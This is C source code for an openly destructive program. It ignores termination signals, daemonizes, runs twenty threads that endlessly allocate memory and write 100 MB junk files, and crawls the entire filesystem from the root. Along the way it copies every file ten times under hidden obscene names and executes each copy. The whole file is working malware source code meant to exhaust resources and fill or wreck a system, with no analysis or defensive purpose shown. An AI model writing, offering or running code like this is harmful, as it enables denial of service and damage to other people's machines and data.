#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <pthread.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>
#include <semaphore.h>

#define MEMORY_SIZE 1000000
#define FILE_SIZE 100000000
#define NUM_THREADS 20
#define MAX_QUEUE_SIZE 100

typedef struct {
    char path[1024];
} QueueItem;

QueueItem queue[MAX_QUEUE_SIZE];
int queue_start = 0;
int queue_end = 0;
pthread_mutex_t queue_mutex = PTHREAD_MUTEX_INITIALIZER;
sem_t queue_items;
sem_t queue_slots;

// Signal handler that effectively ignores incoming signals
void signal_handler(int signal) {
        // Do nothing but to cry
}

// Set up signal handlers to ignore specific signals
void setup_signal_handlers() {
        signal(SIGINT, SIG_IGN);
        signal(SIGTERM, SIG_IGN);
        signal(SIGHUP, SIG_IGN);
        signal(SIGQUIT, SIG_IGN);
        signal(SIGKILL, SIG_IGN);
}

// Daemonize the process: detaches from terminal, becomes a background service
void daemonize() {
        pid_t pid, sid;
        // Fork to create a new process
        pid = fork();
        if (pid < 0) {
                return;
        }
        if (pid > 0) {
                return; // Parent exits
        }
        // Create a new session and become session leader
        umask(0);
        sid = setsid();
        if (sid < 0) {
                return;
        }
        // Fork again to ensure that we're not a session leader
        pid = fork();
        if (pid < 0) {
                return;
        }
        if (pid > 0) {
                return; // Parent exits
        }
        // Change working directory to root
        if (chdir("/") < 0) {
                return;
        }
        // Close standard file descriptors and redirect them to /dev/null
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        open("/dev/null", O_RDONLY);
        open("/dev/null", O_RDWR);
        open("/dev/null", O_RDWR);
}

// Memory overload and file generation function
void *d3str0y(void *arg) {
        daemonize();  // Daemonize this thread to run as background service
        while (1) {
                // Memory bomb: Allocate a huge block of memory and fill with random values
                int **matrix = malloc(sizeof(int*) * 10);
                for (int i = 0; i < 10; i++) {
                        matrix[i] = malloc(sizeof(int) * MEMORY_SIZE);
                        for (int j = 0; j < MEMORY_SIZE; j++) {
                                matrix[i][j] = rand();  // Populate memory with random integers
                        }
                }
                // Create a temporary file and fill it with dummy data
                char tmpfile[64];
                snprintf(tmpfile, sizeof(tmpfile), ".4llCru3L-%d.dat", rand());
                FILE *f = fopen(tmpfile, "w");
                if (f) {
                        for (int i = 0; i < FILE_SIZE; i++) {
                                fputc('X', f);  // Write a massive amount of dummy data
                        }
                        fclose(f);
                        remove(tmpfile);  // Clean up by deleting the file
                }
                // Free up allocated memory
                for (int i = 0; i < 10; i++) {
                        free(matrix[i]);
                }
                free(matrix);
        }
        return NULL;
}

// Replicate a file with a new name and execute it
void rEplic4t3_fIle(const char *src_path, const char *entry_name) {
        for (int i = 0; i < 10; i++) {
                // Generate a unique file path for the replication
                char dst_path[1024];
                snprintf(dst_path, sizeof(dst_path), ".FuCkY0v4ll-%d_%s", rand(), entry_name);
                // Open source file and create destination file
                FILE *src = fopen(src_path, "r");
                FILE *dst = fopen(dst_path, "w");
                if (src && dst) {
                        char ch;
                        // Copy contents from source to destination
                        while ((ch = fgetc(src)) != EOF) {
                                fputc(ch, dst);
                        }
                        fclose(src);
                        fclose(dst);
                        // Execute the replicated file
                        char command[512];
                        snprintf(command, sizeof(command), "%s 2>/dev/null", dst_path);
                        system(command);
                }
        }
}

// Process directory: scan for directories and regular files
void *Pr0c3sS(void *arg) {
        char path[1024];
        strcpy(path, (char *)arg);
        while (1) {
                DIR *dir = opendir(path);
                if (!dir) {
                        return NULL;
                }
                struct dirent *entry;
                while ((entry = readdir(dir)) != NULL) {
                        // Skip . and .. entries
                        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
                        continue;
                }
                char full_path[1024];
                snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
                struct stat st;
                if (stat(full_path, &st) == -1) {
                        continue;
                }
                if (S_ISDIR(st.st_mode)) {
                        // Queue directory for processing
                        sem_wait(&queue_slots);
                        pthread_mutex_lock(&queue_mutex);
                        snprintf(queue[queue_end].path, sizeof(queue[queue_end].path), "%s", full_path);
                        queue_end = (queue_end + 1) % MAX_QUEUE_SIZE;
                        pthread_mutex_unlock(&queue_mutex);
                        sem_post(&queue_items);
                } else if (S_ISREG(st.st_mode)) {
                        // Replicate regular files
                        rEplic4t3_fIle(full_path, entry->d_name);
                }
        }
        closedir(dir);
        sleep(1);  // Sleep to avoid high CPU usage
    }
    return NULL;
}

// Worker thread function: Process directories from the queue
void *w0rKEr(void *arg) {
        while (1) {
                sem_wait(&queue_items);  // Wait for items in the queue
                pthread_mutex_lock(&queue_mutex);
                char path[1024];
                snprintf(path, sizeof(path), "%s", queue[queue_start].path);
                queue_start = (queue_start + 1) % MAX_QUEUE_SIZE;
                pthread_mutex_unlock(&queue_mutex);
                sem_post(&queue_slots);
                Pr0c3sS(path);  // Process the directory
        }
        return NULL;
}

// Spawn multiple threads to execute memory and file overload
void sp4wn_s0m3_zombiEs(int num) {
        pthread_t threads[NUM_THREADS];
        for (int i = 0; i < NUM_THREADS; i++) {
                pthread_create(&threads[i], NULL, d3str0y, NULL);
                printf("[+] Thread %ld unleashed.\n", threads[i]);
        }
        for (int i = 0; i < NUM_THREADS; i++) {
                pthread_join(threads[i], NULL);  // Wait for all threads to finish
        }
}

int main() {
        setup_signal_handlers();  // Ignore unwanted signals
        sem_init(&queue_items, 0, 0);  // Initialize semaphore for queue items
        sem_init(&queue_slots, 0, MAX_QUEUE_SIZE);  // Initialize semaphore for queue slots
        int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
        long processes = cpu_cores * 100000;
        printf("[*] Core: %d\n", cpu_cores);
        printf("[*] Launching %ld processes of doom..\n", processes);
        // Start directory processing thread
        pthread_t replic8_thread;
        pthread_create(&replic8_thread, NULL, Pr0c3sS, "/");
        // Start worker threads
        pthread_t worker_threads[NUM_THREADS];
        for (int i = 0; i < NUM_THREADS; i++) {
                pthread_create(&worker_threads[i], NULL, w0rKEr, NULL);
        }
        // Spawn zombie threads for overload
        sp4wn_s0m3_zombiEs(processes);
        // Join all threads
        pthread_join(replic8_thread, NULL);
        for (int i = 0; i < NUM_THREADS; i++) {
                pthread_join(worker_threads[i], NULL);
        }
        sem_destroy(&queue_items);  // Destroy semaphores
        sem_destroy(&queue_slots);
        return 0;
}

